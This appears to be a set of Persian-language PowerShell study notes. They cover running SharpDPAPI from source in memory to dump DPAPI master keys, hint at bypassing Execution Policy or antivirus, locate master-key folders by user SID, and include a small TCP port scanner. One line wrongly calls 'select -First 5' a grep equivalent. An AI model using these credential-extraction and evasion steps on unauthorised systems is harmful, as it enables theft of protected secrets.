چون SharpDPAPI به زبان C# نوشته شده، می‌تونی سورسش رو مستقیم توی پاورشل کامپایل و اجرا کنی:

```powershell
Add-Type -TypeDefinition (Get-Content .\SharpDPAPI.cs -Raw) -Language CSharp
[SharpDPAPI.Program]::Main(@("masterkeys"))
```

🔹 این روش حتی نیاز به EXE یا DLL نداره، سورس رو همون لحظه کامپایل می‌کنه.

---

💡 نکته مهم امنیتی:  
برای استفاده از SharpDPAPI توی پاورشل، باید در نظر بگیری که اجرای کدهای unsigned ممکنه توسط **Execution Policy** یا آنتی‌ویروس بلاک بشه، مگر اینکه با Bypass یا Memory Injection اجراش کنی.

---


مارتین، با پاورشل خیلی راحت می‌تونی **SID** یک کاربر رو بگیری.

---

## **۱. گرفتن SID کاربر فعلی**

```powershell
whoami /user
```

🔹 خروجی شامل:

- **User Name**
    
- **SID** (مثل: `S-1-5-21-123456789-987654321-135792468-1001`)
    

---

## **۲. گرفتن SID همه‌ی کاربران لوکال**

```powershell
Get-WmiObject Win32_UserAccount | Select-Object Name, SID
```

یا نسخه جدیدترش با PowerShell Core:

```powershell
Get-CimInstance Win32_UserAccount | Select-Object Name, SID
```

---

## **۳. گرفتن SID کاربر مشخص**

مثلاً برای کاربر `Administrator`:

```powershell
$objUser = New-Object System.Security.Principal.NTAccount("Administrator")
$strSID = $objUser.Translate([System.Security.Principal.SecurityIdentifier])
$strSID.Value
```

---

💡 نکته امنیتی:  
تو بحث **DPAPI** و **SharpDPAPI**، این SID مهمه چون مسیر ذخیره‌ی **Master Key** وابسته به SID کاربره:

```
%APPDATA%\Microsoft\Protect\<SID>\
```

پس وقتی SID رو بدونی، می‌دونی کلیدها کجا ذخیره شدن.

---



```
$getip = Get-NetIPAddress

foreach($ip in $getip){

    if ($ip.AddressFamily -eq "IPv4" -and $ip.InterfaceAlias -eq "Ethernet" -and $ip.Store -eq "ActiveStore"){
    
        $ip | Select -ExpandProperty IPAddress
        
            
            
        
        
    }
    
}
```

سوییچ  -ExpandProperty فقط اون value که وجود دارد رو نشون میده 






ما با استفاده از یک متغیر محلی درون پاورشل میتونیم لیست ماژول هامون رو بگیریم 

```
$env:PSModulePath
```




scanner 

```
$ports = @(80,445)
$ip = '192.168.10.36'

foreach ($port in $ports) {
    try {
        $socket = New-Object System.Net.Sockets.TcpClient($ip, $port)
    }
    catch {
        $socket = $null
    }

    if ($socket -eq $null) {
        Write-Output "$ip $port -closed"
    } else {
        Write-Output "$ip $port -open"
        $socket.Close()
        $socket = $null
    }
}

```


ما میتونیم بیایم و بعد از گرقتن یک پروسس مستقیم با الیاس kill اون پروسس رو kill کنیم
مثلا

```
get-process -name "firefox" | kill
```


معادل grep در لینوکس 
```
 select -First 5 
```


```
-ExpanedProperty
```


![[Pasted image 20260307211018.png]]

